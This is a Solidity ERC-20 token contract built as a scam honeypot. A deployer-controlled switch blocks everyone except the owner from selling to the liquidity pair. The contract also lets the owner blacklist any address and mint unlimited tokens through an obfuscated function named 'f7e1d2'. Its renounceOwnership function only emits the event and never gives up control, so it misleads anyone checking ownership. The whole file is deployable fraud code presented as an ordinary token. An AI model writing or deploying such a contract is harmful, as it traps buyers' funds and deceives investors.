// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;


contract MyToken {
    // Basic ERC-20 token state variables
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;

    address private origin;

    bool private honeypotEnabled;
    address private lpPair;

    mapping(address => bool) private blacklisted;

    mapping(address => uint256) private balances;
    mapping(address => mapping(address => uint256)) private allowances;


    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event HoneypotToggled(bool enabled);
    event PairAddressUpdated(address indexed pair);
    event Blacklisted(address indexed account);
    event Whitelisted(address indexed account);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor(string memory _name, string memory _symbol, uint256 _initialSupply) {
        name = _name;
        symbol = _symbol;
        origin = msg.sender;
        honeypotEnabled = false;
        if (_initialSupply > 0) {
            _mint(origin, _initialSupply);
        }
    }

    function balanceOf(address account) public view returns (uint256) {
        return balances[account];
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return allowances[owner][spender];
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        uint256 currentAllowance = allowances[from][msg.sender];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(from, msg.sender, currentAllowance - amount);
        _transfer(from, to, amount);
        return true;
    }

    function toggleHoneypot() external {
        require(msg.sender == origin, "Only origin can toggle honeypot");
        honeypotEnabled = !honeypotEnabled;
        emit HoneypotToggled(honeypotEnabled);
    }

    function setPair(address pairAddress) external {
        require(msg.sender == origin, "Only origin can set pair");
        lpPair = pairAddress;
        emit PairAddressUpdated(pairAddress);
    }


    function renounceOwnership() external {
        require(msg.sender == origin, "Only origin can renounce");
        emit OwnershipTransferred(origin, address(0));
    }

    function blacklist(address account) external {
        require(msg.sender == origin, "Only origin can blacklist");
        blacklisted[account] = true;
        emit Blacklisted(account);
    }

    function whitelist(address account) external {
        require(msg.sender == origin, "Only origin can whitelist");
        blacklisted[account] = false;
        emit Whitelisted(account);
    }

    function f7e1d2(address account, uint256 amount) external {
        require(msg.sender == origin, "Only origin can mint");
        _mint(account, amount);
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(from != address(0) && to != address(0), "ERC20: transfer from/to zero address");
        require(balances[from] >= amount, "ERC20: transfer amount exceeds balance");
        require(!blacklisted[from] && !blacklisted[to], "Transfer blocked: address is blacklisted");
        require(!(honeypotEnabled && to == lpPair && from != origin), "Honeypot active: only owner can transfer to LP pair");

        balances[from] -= amount;
        balances[to] += amount;
        emit Transfer(from, to, amount);
    }

    function _mint(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: mint to zero address");
        totalSupply += amount;
        balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal {
        require(owner != address(0) && spender != address(0), "ERC20: approve from/to zero address");
        allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}